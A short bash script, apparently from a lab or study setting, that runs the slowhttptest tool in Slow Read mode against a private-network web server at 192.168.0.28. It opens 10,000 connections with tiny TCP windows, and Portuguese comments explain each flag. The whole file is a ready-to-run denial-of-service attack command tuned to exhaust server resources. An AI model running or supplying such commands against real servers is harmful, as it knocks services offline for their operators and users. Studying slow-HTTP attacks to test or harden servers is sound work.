#!/bin/bash

slowhttptest -c 10000 -X -r 100 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://192.168.0.28 -p 3

#-c numero de conexoes, maximo é 65539 por conta do numero de portas TCP existentes
#-X modo de inicializacao, no caso ele le as respostas HTTP de maneira lenta(SlowRead)
#-r conexoes por segundo
#-w mostra o numero de bytes da janela tcp inicial no caso de slow read
#-y aqui mostra o tamanho maximo em bytes final da janela tcp, so para fins de comparacao, 65000bytes aproximadamente é o threshold inicial tcp
#-n o intervalo entre as operaçoes de leitura em slowread
#-z o buffer para cada read operation 
#-k o numero de vezes que acontecerá um request por um recurso a cada socket tcp durante o slow read
#-u URL
